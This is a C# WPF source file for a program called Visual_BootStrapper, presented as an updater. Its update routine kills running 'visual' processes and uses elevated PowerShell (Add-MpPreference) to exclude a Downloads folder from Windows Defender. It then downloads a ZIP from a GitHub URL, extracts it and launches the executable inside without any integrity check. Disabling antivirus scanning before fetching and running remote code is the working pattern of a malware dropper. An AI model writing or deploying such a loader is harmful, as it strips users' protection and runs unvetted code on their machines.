// MainWindow.xaml.cs
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows;

namespace Visual_BootStrapper
{
    public partial class MainWindow : Window
    {
        // Direct link to your ZIP
        private const string ZipUrl = @"https://github.com/tnewman-afk/latestvisual/raw/refs/heads/main/1.0.4(1).zip";

        public MainWindow()
        {
            InitializeComponent();
        }

        private async void BtnDownload_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // ── 1) Kill any running visual.exe ───────────────────────────────
                Log("Checking for running visual.exe…");
                var running = Process.GetProcessesByName("visual");
                foreach (var proc in running)
                {
                    try
                    {
                        Log($"Killing PID {proc.Id}…");
                        proc.Kill();
                        proc.WaitForExit();
                        Log($"Killed PID {proc.Id}");
                    }
                    catch (Exception exKill)
                    {
                        Log($"Failed to kill PID {proc.Id}: {exKill.Message}");
                    }
                }
                // ────────────────────────────────────────────────────────────────

                Log("Starting update…");

                // ── 2) Prepare Downloads\\visual folder ──────────────────────────
                string downloadFolder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    "Downloads", "visual");

                if (!Directory.Exists(downloadFolder))
                {
                    Log("Creating folder…");
                    Directory.CreateDirectory(downloadFolder);
                }
                else
                {
                    Log("Clearing existing files…");
                    foreach (var f in Directory.GetFiles(downloadFolder))
                        File.Delete(f);
                    foreach (var d in Directory.GetDirectories(downloadFolder))
                        Directory.Delete(d, true);
                }

                // ── 3) Add Defender exclusion (requires elevation) ───────────────
                try
                {
                    Log("Adding Windows Defender exclusion…");
                    var psi = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-Command \"Add-MpPreference -ExclusionPath '{downloadFolder}'\"",
                        Verb = "runas",
                        CreateNoWindow = true,
                        UseShellExecute = true
                    };
                    using var p = Process.Start(psi);
                    p?.WaitForExit();
                }
                catch (Exception exDef)
                {
                    Log($"Warning: could not set Defender exclusion: {exDef.Message}");
                }

                // ── 4) Download the ZIP ───────────────────────────────────────────
                string zipPath = Path.Combine(downloadFolder, "release.zip");
                Log($"Downloading ZIP from {ZipUrl}…");
                using var http = new HttpClient();
                using (var resp = await http.GetAsync(ZipUrl))
                {
                    resp.EnsureSuccessStatusCode();
                    await using var fs = new FileStream(zipPath, FileMode.Create);
                    await resp.Content.CopyToAsync(fs);
                }

                // ── 5) Extract contents ───────────────────────────────────────────
                Log("Extracting…");
                ZipFile.ExtractToDirectory(zipPath, downloadFolder);

                // ── 6) Delete ZIP ────────────────────────────────────────────────
                File.Delete(zipPath);
                Log("Deleted ZIP");

                // ── 7) Launch visual.exe ─────────────────────────────────────────
                Log("Locating visual.exe…");
                var exe = Directory
                    .EnumerateFiles(downloadFolder, "visual.exe", SearchOption.AllDirectories)
                    .FirstOrDefault();

                if (exe == null)
                    throw new FileNotFoundException("visual.exe not found in extracted files.");

                Log($"Launching {exe}…");
                Process.Start(new ProcessStartInfo(exe) { UseShellExecute = true });

                Log("Update complete!");
            }
            catch (Exception ex)
            {
                Log($"Error: {ex.Message}");
            }
        }

        private void Log(string message)
        {
            TxtLog.Text += $"{DateTime.Now:HH:mm:ss} • {message}\n";
        }
    }
}
